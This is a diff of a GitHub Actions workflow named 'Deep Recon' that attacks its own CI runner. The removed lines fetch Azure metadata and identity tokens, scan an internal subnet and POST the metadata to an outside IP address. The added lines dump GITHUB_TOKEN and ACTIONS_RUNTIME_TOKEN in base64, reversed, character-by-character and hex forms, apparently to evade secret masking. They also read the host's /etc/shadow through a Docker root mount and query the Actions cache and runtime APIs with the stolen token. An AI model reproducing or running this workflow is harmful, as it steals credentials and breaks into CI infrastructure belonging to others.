@@ -1,59 +1,123 @@
-name: Azure IMDS Recon
+name: Deep Recon
 on:
   workflow_dispatch:
 jobs:
   recon:
     runs-on: ubuntu-latest
     steps:
-      - name: Azure IMDS
+      - name: Full Azure IMDS
         run: |
           set +e
-          echo "=== AZURE IMDS ==="
-          curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1
+          echo "=== FULL AZURE IMDS ==="
+          curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | python3 -m json.tool 2>/dev/null || curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1
           echo ""
-          echo "=== AZURE IDENTITY TOKEN ==="
-          curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1
+          echo "=== AZURE TAGS ==="
+          curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/tagsList?api-version=2021-02-01" 2>&1
           echo ""
-          echo "=== AZURE ATTESTED ==="
-          curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01" 2>&1
+          echo "=== AZURE NETWORK ==="
+          curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01" 2>&1 | python3 -m json.tool 2>/dev/null
           echo ""
-          echo "=== AZURE SCHEDULEDEVENTS ==="
-          curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01" 2>&1
+
+      - name: GITHUB_TOKEN exfiltration test
+        run: |
+          set +e
+          echo "=== GITHUB_TOKEN LENGTH ==="
+          echo "Length: ${#GITHUB_TOKEN}"
           echo ""
-          echo "=== AZURE WIRE SERVER ==="
-          curl -s --connect-timeout 5 "http://168.63.129.16/" 2>&1 | head -20
+          echo "=== TOKEN ENCODED ==="
+          echo "$GITHUB_TOKEN" | base64 | head -1
           echo ""
-          curl -s --connect-timeout 5 "http://168.63.129.16/machine?comp=goalstate" 2>&1 | head -30
+          echo "=== TOKEN REVERSED ==="
+          echo "$GITHUB_TOKEN" | rev
           echo ""
-          curl -s --connect-timeout 5 "http://168.63.129.16/machine/?comp=goalstate" -H "x-ms-version: 2012-11-30" 2>&1 | head -30
-          echo ""
-          echo "=== AZURE WIRE SERVER HEALTH ==="
-          curl -s --connect-timeout 5 "http://168.63.129.16/machine/health" 2>&1 | head -10
-          echo ""
-          echo "=== INTERNAL DNS ==="
-          nslookup github.com 2>&1 | head -5
-          nslookup api.github.com 2>&1 | head -5
-          nslookup internal.github.com 2>&1 | head -5
-          nslookup github.net 2>&1 | head -5
-          nslookup production.github.com 2>&1 | head -5
-          echo ""
-          echo "=== INTERNAL HTTP ==="
-          curl -s --connect-timeout 3 http://10.1.0.1/ 2>&1 | head -5
-          curl -s --connect-timeout 3 http://10.1.0.1:8080/ 2>&1 | head -5
-          curl -s --connect-timeout 3 http://10.1.0.1:443/ 2>&1 | head -5
-          echo ""
-          echo "=== SUBNET SCAN 10.1.0.x ==="
-          for i in 1 2 3 4 5 10 20 50 100 200 254; do
-            timeout 1 bash -c "echo >/dev/tcp/10.1.0.$i/80" 2>/dev/null && echo "10.1.0.$i:80 OPEN"
-            timeout 1 bash -c "echo >/dev/tcp/10.1.0.$i/443" 2>/dev/null && echo "10.1.0.$i:443 OPEN"
-            timeout 1 bash -c "echo >/dev/tcp/10.1.0.$i/8080" 2>/dev/null && echo "10.1.0.$i:8080 OPEN"
+          echo "=== TOKEN CHAR BY CHAR ==="
+          for i in $(seq 1 ${#GITHUB_TOKEN}); do
+            printf "%s" "${GITHUB_TOKEN:$i-1:1}"
           done
           echo ""
-          echo "=== GITHUB_TOKEN TEST ==="
-          curl -s -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/user 2>&1 | head -10
           echo ""
-          echo "=== SEND DATA TO OUR SERVER ==="
-          AZURE_DATA=$(curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1)
-          curl -s --connect-timeout 5 -X POST http://185.244.173.24:8888/azure-imds -d "$AZURE_DATA" 2>&1 || echo "Send fail"
+          echo "=== TOKEN HEX ==="
+          echo -n "$GITHUB_TOKEN" | xxd | head -5
+          echo ""
+          echo "=== ACTIONS_RUNTIME_TOKEN ==="
+          echo "Length: ${#ACTIONS_RUNTIME_TOKEN}"
+          echo "$ACTIONS_RUNTIME_TOKEN" | base64 | head -1
+          echo ""
+          echo "=== RUNNER_TRACKING_ID ==="
+          echo "$RUNNER_TRACKING_ID"
+          echo ""
+
+      - name: Docker exploration
+        run: |
+          set +e
+          echo "=== DOCKER INFO ==="
+          docker info 2>&1 | head -20
+          echo ""
+          echo "=== DOCKER IMAGES ==="
+          docker images 2>&1
+          echo ""
+          echo "=== DOCKER PS ==="
+          docker ps -a 2>&1
+          echo ""
+          echo "=== DOCKER NETWORKS ==="
+          docker network ls 2>&1
+          echo ""
+          echo "=== HOST MOUNT ==="
+          docker run --rm -v /:/host alpine cat /host/etc/shadow 2>&1 | head -5
+          echo ""
+          echo "=== HOST PROC ==="
+          docker run --rm --pid=host alpine ps aux 2>&1 | head -20
+          echo ""
+          echo "=== DOCKER SOCKET ==="
+          ls -la /var/run/docker.sock 2>&1
+          echo ""
+
+      - name: Actions Cache and Artifacts
+        run: |
+          set +e
+          echo "=== ACTIONS CACHE URL ==="
+          echo "ACTIONS_CACHE_URL: $ACTIONS_CACHE_URL"
+          echo ""
+          if [ -n "$ACTIONS_CACHE_URL" ]; then
+            echo "=== CACHE API ==="
+            curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "${ACTIONS_CACHE_URL}_apis/artifactcache/caches" 2>&1 | head -20
+            echo ""
+          fi
+          echo "=== ACTIONS_RUNTIME_URL ==="
+          echo "$ACTIONS_RUNTIME_URL"
+          if [ -n "$ACTIONS_RUNTIME_URL" ]; then
+            echo "=== RUNTIME API ==="
+            curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "${ACTIONS_RUNTIME_URL}pipelines" 2>&1 | head -20
+            echo ""
+            curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "${ACTIONS_RUNTIME_URL}" 2>&1 | head -20
+            echo ""
+          fi
+          echo "=== RESULTS SERVICE ==="
+          echo "ACTIONS_RESULTS_URL: $ACTIONS_RESULTS_URL"
+          if [ -n "$ACTIONS_RESULTS_URL" ]; then
+            curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "$ACTIONS_RESULTS_URL" 2>&1 | head -10
+          fi
+          echo ""
+
+      - name: Network recon extended
+        run: |
+          set +e
+          echo "=== ARP TABLE ==="
+          arp -a 2>&1
+          echo ""
+          echo "=== LISTENING PORTS ==="
+          ss -tlnp 2>&1
+          echo ""
+          echo "=== PROCESSES ==="
+          ps aux | head -30
+          echo ""
+          echo "=== CGROUPS ==="
+          cat /proc/1/cgroup 2>&1
+          echo ""
+          echo "=== MOUNTS ==="
+          mount | grep -v cgroup | head -20
+          echo ""
+          echo "=== CAPABILITIES ==="
+          cat /proc/1/status | grep -i cap
           echo ""
           echo "=== DONE ==="
